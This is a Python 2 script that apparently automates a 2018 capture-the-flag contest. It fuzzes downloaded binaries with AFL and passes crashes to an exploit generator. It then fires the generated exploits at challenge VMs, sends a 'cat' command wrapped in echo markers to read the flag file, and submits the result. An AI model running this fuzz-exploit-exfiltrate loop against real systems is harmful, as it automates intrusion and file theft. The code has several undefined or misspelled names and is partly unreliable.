#!/usr/bin/env python
# coding=utf-8

import api
import requests
import time
import multiprocessing
import os
# import local_server
import afl
import config
from pwn import *
import IsInterActive



download_binary_pass = 0
FUZZ_NUM = 5
MAX_FUZZ_TIME = 600
MAX_FUZZ_TIME_ADD = 10
MAX_EXPLOIT_TIME = 600
MAX_EXPLOIT_TIME_ADD = 10

AFL_DEBUG = False
context.log_level = 'debug'

FUZZ_MAKR = 1
SLEEP_MAIN_SECOND = 5
CHALLENGE_PATH = "challenges/"

TODO_TEST_EXP = 1
# from emulator import *
# if TODO_TEST_EXP:
#
#     from exp_gen import *


class Challenge(object):
    """
    对应官方下载的每一个题目
    """
    def __init__(self, challenge, bin_path):
        """ init """
        self._challengeID = challenge['challengeID']
        self._score = challenge['score']
        self._vm_ip = challenge['vm_ip']
        self._vm_name = challenge['vm_name']
        self._question_port = int(challenge['question_port'])
        self._binaryUrl = challenge['binaryUrl']
        self._flag_path = challenge['flag_path']
        self.bin_path = bin_path

        self.priority_mark = 1000
        self.interactive = None
        self.fuzz_status = False
        self.exploit_status = False
        self.submit_status = False

    def get_id(self):
        return self._challengeID

    def get_ip_port(self):
        return self._vm_ip, self._question_port

    def get_flag_path(self):
        return self._flag_path

    def get_bin_path(self):
        return self.bin_path

    def set_priority_mark(self, priority_mark):
        self.priority_mark = priority_mark

    def get_priority_mark(self):
        return self.priority_mark


    def set_interactive(self, interactive):
        self.interactive = interactive


    def get_interactive(self):
        return self.interactive

    def set_fuzz_status(self, fuzz_status):
        self.fuzz_status = fuzz_status

    def get_fuzz_status(self):
        return self.fuzz_status

    def set_exploit_status(self, exploit_status):
        self.exploit_status = exploit_status

    def get_exploit_status(self):
        return self.exploit_status

    def set_submit_status(self, submit_status):
        self.submit_status = submit_status

    def get_submit_status(self):
        return self.submit_status


    def start_fuzz(self):
        """
        本题开始FUZZ,修改FUZZ状态和分数
        :return:
        """
        print "\t\t [C] CHALLENGE START FUZZ! ID -> %d ,priority_mark -> %d" % (self._challengeID, self.priority_mark)
        self.priority_mark -= FUZZ_MAKR
        self.fuzz_status = True

    def start_exploit(self):
        """
        本题开始exploit
        :return:
        """
        self.exploit_status = True
        print "\t\t [C] CHALLENGE START EXPLOIT ! ID -> %d " % self._challengeID


class Robot(object):
    def __init__(self, challengeID, bin_path): #  bin_path can be deleted later?
        self._challengeID = challengeID
        self._bin_path = bin_path

        self.running_status =  False           # 运行的状态
        self.start_time = None                 # 本次开始运行的时间
        self.total_time = 0                    # 总共运行的时间
        self.running_count = 0                 # 总共运行的次数
        self.proc = None
        # self.pid = None


    def get_id(self):
        return self._challengeID

    def get_running_status(self):
        return self.running_status

    # def set_running_status(self, status):
    #     self.running_status = status

    # def get_start_time(self):
    #     return self.start_time

    # def set_start_time(self, time):
    #     self.start_time = time
    def get_running_time(self):
        running_time = time.time() - self.start_time
        return running_time

    # def add_total_time(self):
    #     running_time = time.time() - self.start_time
    #     self.total_time += running_time

    # def get_running_count(self):
    #     return self.running_count

    # def add_running_count(self):
    #     self.running_count += 1

    # def get_proc(self):
    #     return self.proc

    def set_proc(self, proc):
        self.proc = proc
    #
    # def get_pid(self):
    #     return self.pid
    #
    # def set_pid(self, pid):
    #     self.pid = pid



class AFLRobot(Robot):
    """
    对于fuzz模块的封装类
    """
    def __init__(self, challengeID, bin_path):
        Robot.__init__(self, challengeID, bin_path)
        self.afl_obj = None
        self.crashes = []
        self.maxtime = MAX_FUZZ_TIME

    def start_fuzz(self):
        """
        １．修改状态、开始时间、fuzz次数
        ２．调用fuzz模块开始fuzz
        :return:
        """
        self.running_status = True
        self.start_time = time.time()
        self.running_count += 1

        if afl.check_docker():
            afl_path = config.afl_path_docker
        else:
            afl_path = config.afl_path_local # config.afl_path_docker##


        self.afl_obj = afl.AFL(binary=self._bin_path, afl=afl_path, debug=AFL_DEBUG)
        self.afl_obj.start()
        print "\t\t [A] AFLRobot.start_fuzz  challenge %d ,running_count is %d" % (self._challengeID, self.running_count )

    def stop_fuzz(self):
        """
        1. 修改状态、总时间、清除开始时间
        ２．调用fuzz模块停止fuzz
        :return:
        """
        print "\t\t [A] AFLRobot.stop_fuzz  challenge %d ,running_time is %s" % (self._challengeID, time.time() - self.start_time)


        self.running_status = False
        running_time = time.time() - self.start_time
        self.total_time += running_time
        self.start_time = None

        self.afl_obj.stop()
        sleep(1)
        self.afl_obj.stop()


    def get_new_crashes(self):
        tmp_crashes = self.afl_obj.crashes()
        if self.crashes == tmp_crashes:
            return False
        else:
            self.crashes = tmp_crashes
            return self.crashes


    def get_maxtime(self):
        return self.maxtime
    def add_maxtime(self, maxtime_add):
        self.maxtime += maxtime_add


class EXPRobot(Robot):
    def __init__(self, challengeID, bin_path):
        Robot.__init__(self, challengeID, bin_path)
        self.exp_obj = None
        self.crashes = []
        self.expflow = ''
        self.maxtime = MAX_EXPLOIT_TIME


    def start_exploit(self, crashes):
        """
        需要传递的参数：
            bin path
            crash 列表
        :return:
        """
        # self.exp_obj = EXP()
        # exp_obj.start_exploit()
        print "\t\t [*] EXPRobot.start_exploit..."
        #　多进程数据共享有问题，非多进程时再换回来
        # self.running_status = True
        # self.start_time = time.time()
        # self.running_count += 1
        #
        # # todo exp_obj.start_exploit()
        # self.crashes = crashes
        if TODO_TEST_EXP:
            self.running_status = True
            self.start_time = time.time()
            self.running_count += 1
            self.crashes = crashes

            self.exp_obj = Exp_gen(self._bin_path, crashes)
            self.exp_obj.start()

        else:
            time.sleep(1000)



    def stop_exploit(self):
        print "\t\t [*] EXPRobot.stop_exploit..."
        self.running_status = False
        # running_time = time.time() - self.start_time
        # self.total_time +=  running_time
        self.start_time = None

        # todo delete it
        print "\t\t [*] delete proc"

        if TODO_TEST_EXP:
            self.exp_obj.stopExploit()

        else:
            proc = self.proc
            proc.terminate()


    def get_exploit_flow(self):
        """
        获取攻击流量
        :return:
        """
        # todo exp_obj.get_exploit_flow()
        if TODO_TEST_EXP:
            exp_path_list = self.exp_obj.getExp()
            if len(exp_path_list) == 0:
                print "\t\t [E]exp is []..."
                return exp_path_list
            else:
                print "\t\t [E]get %d exp_flow" % len(exp_path_list)
                exp_flow_list = []
                for exp_path in exp_path_list:
                    print "\t\t [E] exp_path is %s" % exp_path
                    with open(exp_path,'r+') as f :
                        exp_flow = f.read()
                    exp_flow_list.append(exp_flow)
                return exp_flow_list

        else:
            if self._challengeID != 2:
                return []
            try:
                exp_flow_list = []
                with open("./panda@rhg/input_exp2") as f:
                    tmp_expflow  = f.read()
                if self.expflow == tmp_expflow:
                    print "\t\t [*]Exprobot.get_exploit_flow  challenge_id -> %d , expflow is same..." % self._challengeID
                    return []
                else:
                    self.expflow = tmp_expflow
                    exp_flow_list.append(tmp_expflow)
                    return exp_flow_list
            except Exception as e:
                print e


    def get_maxtime(self):
        return self.maxtime

    def add_maxtime(self, maxtime_add):
        self.maxtime += maxtime_add



def initial_list(challenge_list, aflrobot_list, exprobot_list):
    """
    download challenges and initial challenge_list aflrobot_list exprobot_list
    :param challenge_list:
    :param aflrobot_list:
    :param exprobot_list:
    :return:
    """
    print "\t[*] initial_list #1 download challenges..."
    api.make_folder(CHALLENGE_PATH)
    challenge_download_list = api.get_question_status()
    file_number = 0

    for c_d_l in challenge_download_list:
        log.info(c_d_l)
        id = c_d_l['challengeID']
        dir_name = unicode(id) + "/"
        file_name = "bin"
        target_dir = CHALLENGE_PATH + dir_name
        binary_path = CHALLENGE_PATH + dir_name +  file_name
        api.make_folder(target_dir)
        if not download_binary_pass:
            try:
                log.info("downloading binary %d" % id)
                r = requests.get(c_d_l['binaryUrl'], headers = {'User-Agent': 'curl / 7.47.0'}, timeout=100)
                with open(binary_path, "wb") as f:
                    f.write(r.content)
                file_number += 1
            except Exception as e:
                log.info(unicode(e))
                exit(-1)
        else:
            print "\t[!] USE OLD BINARY"

        # initial challenge_list
        challenge = Challenge(c_d_l, binary_path)
        challenge_list.append(challenge)

        # intial aflrobot_list
        aflrobot = AFLRobot(id, binary_path)
        aflrobot_list.append(aflrobot)

        # initial exprobot_list
        exprobot = EXPRobot(id, binary_path)
        exprobot_list.append(exprobot)

    print "\t[*] download %d files success..." % file_number
    print "\t[*] initial_list success #1 challenge_list, aflrobot_list, exprobot_list  ..."
    print "\t[*] challenge_list %s " % challenge_list

# def worker_fuzz(aflrobot):
#     """
#     worker_fuzz是新开启的进程将要执行的函数
#     新建一个AFLRobot对象开始FUZZ
#     :param aflrobot: 当前task的状态，根据task_dict_content修改而来
#     :return:
#     """
#     pid = os.getpid()
#     print "\t\t\t [+]work_fuzz %d ..." % pid
#     aflrobot.set_pid(pid)
#     aflrobot.start_fuzz()


def get_challenge_by_id(id, challenge_list):
    for c in challenge_list:
        if c.get_id() == id:
            return c

def get_aflrobot_by_id(id, aflrobot_list):
    for r in aflrobot_list:
        if r.get_id() == id:
            return r

def get_exprobot_by_id(id, exprobot_list):
    for r in exprobot_list:
        if r.get_id() == id:
            return r


def get_running_aflrobot_list(aflrobot_list):
    running_aflrobot_list = []
    for aflrobot in aflrobot_list:
        if aflrobot.get_running_status() == True:
            running_aflrobot_list.append(aflrobot)
    return running_aflrobot_list

def get_running_exprobot_list(exprobot_list):
    running_exprobot_list = []
    for exprobot in exprobot_list:
        if exprobot.get_running_status() == True:
            running_exprobot_list.append(exprobot)
    return running_exprobot_list

def get_id_list_from_aflrobot_list(aflrobot_list):
    id_list = []
    for r in aflrobot_list:
        id_list.append(r.get_id())
    return id_list

def get_id_list_from_exprobot_list(exprobot_list):
    id_list = []
    for r in exprobot_list:
        id_list.append(r.get_id())
    return id_list

def get_id_list_from_challenge_list(challenge_list):
    id_list = []
    for r in challenge_list:
        id_list.append(r.get_id())
    return id_list


def start_new_aflrobot(aflrobot_list, challenge_list):
    """
    开始运行新的robot
    :param aflrobot_list:
    :param challenge_list:
    :return:
    """
    running_aflrobot_list = get_running_aflrobot_list(aflrobot_list)
    running_exprobot_list = get_running_exprobot_list(exprobot_list)
    running_allrobot_number = len(running_aflrobot_list ) + len(running_exprobot_list)

    if running_allrobot_number >= FUZZ_NUM:
        id_list = get_id_list_from_aflrobot_list(running_aflrobot_list)
        print "\t\t [!] running_aflrobot_number -> %d , running_aflrobot_list id ->  %s" % (len(running_aflrobot_list), id_list)
    else:
        has_fuzz = 0
        while running_allrobot_number < FUZZ_NUM:
            # 是否还有未FUZZ的CHALLENGE
            for challenge in challenge_list:
                if challenge.get_submit_status() == False & challenge.get_fuzz_status() == False:
                    has_fuzz = 1
                    break
            if has_fuzz == 0:
                loggging.warinig("NOTHING TO BE FUZZED!")
                break

            # 取出分数最高的challenge_id
            max_id, max = -1, -10000000000
            for challenge in challenge_list:
                # 取出尚未FUZZ的challenge
                if challenge.get_submit_status() == True | challenge.get_fuzz_status() == True:
                    continue
                temp = challenge.get_priority_mark()
                if temp > max:
                    max = temp
                    max_id = challenge.get_id()
            # now_task = sorted(task_dict.items(), lambda x, y: cmp(x[1]["priority_mark"], y[1]["priority_mark"]))[0]
            # 运行aflrobot_list　中的机器人
            if max_id != -1:
                print "\t [*] start_new_aflrobot..."
                # 修改challenge
                print "\t\t" + "*" * 100
                challenge = get_challenge_by_id(max_id, challenge_list)
                challenge.start_fuzz()

                # todo
                interactive = challenge.get_interactive()

                # 创建aflrobot
                aflrobot = get_aflrobot_by_id(max_id, aflrobot_list)
                aflrobot.start_fuzz()

            running_aflrobot_list = get_running_aflrobot_list(aflrobot_list)
            running_exprobot_list = get_running_exprobot_list(exprobot_list)
            running_allrobot_number = len(running_aflrobot_list) + len(running_exprobot_list)
            id_list = get_id_list_from_aflrobot_list(running_aflrobot_list)
            print "\t\t [!] running_aflrobot_number > %d , running_AFLRobot_list >  %s" % (len(running_aflrobot_list), id_list)


def check_aflrobot_list(aflrobot_list, challenge_list):
    """
    判断是否有AFLRobot不需要继续运行了
        运行时间超过 > MAX_FUZZ_TIME

    :param aflrobot_list:
    :param challenge_list:
    :return:
    """
    running_aflrobot_list = get_running_aflrobot_list(aflrobot_list)
    for aflrobot in running_aflrobot_list:
        id = aflrobot.get_id()
        running_time =  aflrobot.get_running_time()
        maxtime = aflrobot.get_maxtime()
        if running_time > maxtime:
            print "\t [*] check_aflrobot_list"
            print "\t\t [*] aflrobot id -> %d , running_time -> %s , maxtime -> %s" %(id, running_time, maxtime)

            aflrobot.add_maxtime(MAX_EXPLOIT_TIME_ADD)
            aflrobot.stop_fuzz()


            challenge = get_challenge_by_id(id, challenge_list)
            challenge.set_fuzz_status(False)

def worker_exploit(exprobot, crashes):
    print "\t\t work exploit..."
    exprobot.start_exploit(crashes)



def start_new_exprobot(aflrobot_list, exprobot_list, challenge_list):
    """
    判断是否有新的crash产生，有的话就创建exprobot
    :param aflrobot_list:
    :param exprobot_list:
    :return:
    """
    running_aflrobot_list = get_running_aflrobot_list(aflrobot_list)

    for aflrobot  in running_aflrobot_list:
        id = aflrobot.get_id()
        crashes = aflrobot.get_new_crashes()

        if crashes :
            print "\t\t [*]CRASHES challenge_id -> %d , crashes -> %s" %(id,crashes)

            # 修改challenge exploit的状态
            challenge = get_challenge_by_id(id, challenge_list)
            challenge.start_exploit()

            # 开始exploit
            exprobot = get_exprobot_by_id(id, exprobot_list)

            # todo delete process
            # exprobot.start_exploit(crashes)
            if TODO_TEST_EXP:
                exprobot.start_exploit(crashes)
            else:
                proc = multiprocessing.Process(target=worker_exploit, args=(exprobot, crashes))
                proc.deamon = True
                exprobot.set_proc(proc)

                # 暂时这样修改,原则上在类外面最好不要直接对成员进行修改，整合好exp模块后，删除多进程的方式
                exprobot.running_status = True
                exprobot.start_time = time.time()
                exprobot.running_count += 1
                exprobot.crashes = crashes

                proc.start()

            # 检测出crash就停止fuzz
            aflrobot.stop_fuzz()
            challenge.set_fuzz_status(False)


    running_exprobot_list = get_running_exprobot_list(exprobot_list)
    running_exprobot_num = len(running_exprobot_list)
    id_list = get_id_list_from_exprobot_list(running_exprobot_list)
    print "\t\t [!] running_exprobot_number -> %d , running_exprobot_list id ->  %s" % (running_exprobot_num, id_list)



def check_exprobot_list(exprobot_list, challenge_list):
    """
    检查exprobot是否超时，如果超时就杀掉
    :param exprobot_list:
    :param challenge_list:
    :return:
    """
    running_exprobot_list = get_running_exprobot_list(exprobot_list)
    for exprobot in running_exprobot_list:
        id = exprobot.get_id()
        running_time = exprobot.get_running_time()
        maxtime = exprobot.get_maxtime()
        if running_time > maxtime:
            print "\t [*] check_exprobot_list"
            print "\t\t [*] DELETE challenge %d ,running_time is %d, maxtime -> %s" % (id, running_time, maxtime)
            # stop this exprobot ???

            exprobot.add_maxtime(MAX_EXPLOIT_TIME_ADD)
            exprobot.stop_exploit()

            challenge = get_challenge_by_id(id, challenge_list)
            challenge.set_exploit_status(False)


def start_new_expflow(exprobot_list, challenge_list, aflrobot_list):
    """
    1. 如果exprobot产生了流量，就尝试用这个流量打远程，返回ｆｌａｇ
    2. 提交flag, 如果成功修改submit_status
    :param exprobot_list:
    :param challenge_list:
    :return:
    """
    running_exprobot_list = get_running_exprobot_list(exprobot_list)
    for exprobot in running_exprobot_list:
    # for exprobot in exprobot_list:
        id = exprobot.get_id()
        exp_flow_list = exprobot.get_exploit_flow()
        # if exprobot.get_id() == 2: # test shellcode

        if len(exp_flow_list) != 0 :
            for exp_flow in exp_flow_list:
                print "\t\t [*] start_new_expflow # challenge_id -> %d , exp_flow ..." % (id)

                challenge = get_challenge_by_id(id, challenge_list)
                flag_path = challenge.get_flag_path()
                ip, port = challenge.get_ip_port()

                print "\t\t [*] flag_path -> %s, ip, port -> %s:%d" % (flag_path, ip, port)

                # try:
                flag = ''
                pos1 = "Dubh3-2018a-rhg"
                pos2 = "Dubh3-2018b-rhg"
                payload = "cat %s" % flag_path
                padding = "echo %s&& %s && echo %s"
                payload = padding % (pos1, payload, pos2)
                # print "payload", payload

                # print "*" * 10, 'tmp_data', "*" * 10
                io = remote(ip, port)

                io.send(exp_flow)
                tmp_data = io.recv()
                io.sendline(payload)

                io.recvuntil(pos1)
                data = io.recvuntil(pos2)
                flag = data[: -len(pos2)]

                # string = pos1 + "([\s\S]*)" + pos2
                # pattern = re.compile(string)
                # result = re.match(pattern, data)
                # flag = result.string.replace(pos1, '').replace(pos2, '').replace('\n', '')
                if '\n' in flag:
                    flag = flag.strip('\n')
                print "\t\t [*]flag is...", flag

                # except Exception as e:
                #     print "\t\t [*] cannot get flag！"
                #     print e

                try:
                    if flag :
                        submit_status = api.sub_answer(flag)
                        print "\t\t [*]submit status is ", submit_status
                        if submit_status:
                            # 提交flag成功
                            # 设置exprobot的状态
                            exprobot.stop_exploit()

                            # 设置aflrobot的状态
                            # 如果是单fuzz 单exploit 在拿到CRASH时，利用之前　AFLROBOT已经停了，不需要stop了
                            # aflrobot = get_aflrobot_by_id(id, aflrobot_list)
                            # aflrobot.stop_fuzz()

                            # 设置challenge的状态
                            challenge = get_challenge_by_id(id, challenge_list)
                            challenge.set_fuzz_status(False)
                            challenge.set_exploit_status(False)
                            challenge.set_submit_status(True)

                    else:
                        print "flag is none!"
                except Exception as e :
                    print e

        else:
            "[---]exp_flow is the same...."

def check_submit_status(challenge_list):
    done_challenge_list = []
    for challenge in challenge_list:
        if challenge.get_submit_status() == True :
            done_challenge_list.append(challenge)
    id_list = get_id_list_from_challenge_list(done_challenge_list)
    print "\t\t [!] challenge done list_id %s" %  id_list


def start_robot_server():
    proc = multiprocessing.Process(target=local_server.main )
    proc.deamon = True
    proc.start()


def check_interactive(challenge_list):
    """
    检测是否是交互式，如果是，后续优先调用符号执行来ｆｕｚｚ
    :param challenge_list:
    :return:
    """
    for c in challenge_list:
        bin_path = c.get_bin_path()
        ret, option = IsInterActive.IsInterActive(bin_path)
        # print ret, option
        if ret == True:
            c.set_interactive(True)
        elif ret == False:
            c.set_interactive(False)
    print "\t[!] check_interactive DONE!"


if __name__ == "__main__":
    # 开启　本地服务器
    # 本地服务器需要手工开启　
    #start_robot_server()
    #time.sleep(3)

    challenge_list = []
    aflrobot_list = []
    exprobot_list = []

    print "[1] INITIAL...."
    initial_list(challenge_list, aflrobot_list, exprobot_list)
    check_interactive(challenge_list)
    # todo  send exp_flow if has the same bin
    # todo  modify_challenge_list_mark(challenge_list)

    while True:
        print "-"*30, time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "-"*30
        print "[2] FUZZ...."
        start_new_aflrobot(aflrobot_list, challenge_list)
        check_aflrobot_list(aflrobot_list, challenge_list)

        print "[3] EXPLOIT...."
        start_new_exprobot(aflrobot_list, exprobot_list, challenge_list)
        check_exprobot_list(exprobot_list, challenge_list)

        print "[4] SUBMIT...."
        start_new_expflow(exprobot_list, challenge_list, aflrobot_list)
        check_submit_status(challenge_list)

        time.sleep(SLEEP_MAIN_SECOND)





















